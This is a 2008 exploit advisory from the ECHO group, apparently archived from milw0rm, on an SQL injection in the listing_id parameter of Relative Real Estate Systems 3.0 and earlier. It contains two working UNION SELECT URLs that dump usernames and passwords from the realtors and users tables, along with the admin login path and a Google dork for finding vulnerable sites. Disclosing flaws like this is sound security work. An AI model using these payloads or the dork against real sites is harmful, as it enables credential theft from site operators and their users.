@@ -1,0 +1,100 @@
+____________________   ___ ___ ________
+\_   _____/\_   ___ \ /   |   \\_____  \  
+ |    __)_ /    \  \//    ~    \/   |   \ 
+ |        \\     \___\    Y    /    |    \
+/_______  / \______  /\___|_  /\_______  /
+        \/         \/       \/         \/ 
+
+                                        .OR.ID
+ECHO_ADV_99$2008
+
+-----------------------------------------------------------------------------------------
+[ECHO_ADV_99$2008] Relative Real Estate Systems <= 3.0 (listing_id) Sql Injection Vulnerability
+-----------------------------------------------------------------------------------------
+
+Author       : M.Hasran Addahroni
+Date         : June, 24 th 2008
+Location     : Jakarta, Indonesia
+Web          : http://e-rdc.org/v1/news.php?readmore=101
+Critical Lvl : Medium
+Impact       : System access
+Where        : From Remote
+---------------------------------------------------------------------------
+
+Affected software description:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Application : Relative Real Estate Systems
+version     : <= 3.0
+Vendor      : http://www.dboorn.com/estate/
+Description :
+
+Elegant real estate script that allows for unlimited listings and agents with featured listings, 
+unlimited photos, advanced search engine, user login option, user tracking, dynamic slide shows,
+Mls/Idx support, multiple agents with photo, mortgage calculator, schools info, C.M.A. 
+request form, full admin panel.Requires PHP/Mysql Windows Server or any Web server with php support.
+
+---------------------------------------------------------------------------
+
+Vulnerability:
+~~~~~~~~~~~~~
+
+Input passed to the "listing_id" parameter in index.php is not properly verified before being used 
+in an sql query.
+This can be exploited thru the browser to manipulate SQL queries and pull the username and password from realtors 
+and users in plain text.
+Successful exploitation requires that "magic_quotes" is off.
+
+
+Poc/Exploit:
+~~~~~~~~~
+
+http://[URL]/[path]/index.php?go=listings&listing_id=-30%20union%20select%201,2,3,4,5,6,7,8,concat(id,0x3a,username,0x3a,password,0x3a,email),0,1,2,3,4,5,6,7,8,9,0,1%20from%20realtors--
+
+http://[URL]/[path]/index.php?go=listings&listing_id=-30%20union%20select%201,2,3,4,5,6,7,8,concat(username,0x3a,password),0,1,2,3,4,5,6,7,8,9,0,1%20from%20users--
+
+Admin Login at http://[URL]/[PATH]/Admin/login_index.php
+
+Dork:
+~~~~
+Google : "index.php?go=listings&listing"
+
+
+Solution:
+~~~~~~
+
+- Edit the source code to ensure that input is properly verified.
+- Turn on magic_quotes in php.ini
+
+
+Timeline:
+~~~~~~~~
+
+- 24 - 06 - 2008 bug found
+- 24 - 06 - 2008 vendor contacted
+- 24 - 06 - 2008 advisory released
+---------------------------------------------------------------------------
+
+Shoutz:
+~~~~
+~ ping - my dearest wife, zautha - my little warrior
+~ y3dips,the_day,moby,comex,z3r0byt3,c-a-s-e,S`to,lirva32,pushm0v,az001,negative,
+the_hydra,neng chika, str0ke
+~ everybody [at] SCAN-NUSANTARA and SCAN-ASSOCIATES
+~ masterpop3,maSter-oP,Lieur-Euy,Mr_ny3m,bithedz,murp,sakitjiwa,x16,an0maly,cybertank,
+super_temon, b120t0,inggar,fachri,adi,rahmat,indra,cyb3rh3b
+~ dr188le,SinChan,h4ntu,cow_1seng,poniman_coy,paman_gembul,ketut,rizal,cR4SH3R,
+kuntua, stev_manado,nofry,k1tk4t,0pt1c
+~ newbie_hacker@yahoogroups.com
+~ #aikmel #e-c-h-o @irc.dal.net
+
+---------------------------------------------------------------------------
+Contact:
+~~~~~
+
+K-159 || echo|staff || eufrato[at]gmail[dot]com
+Homepage: http://www.e-rdc.org/
+
+-------------------------------- [ EOF ] ---------------------------------- 
+
+# milw0rm.com [2008-06-24]
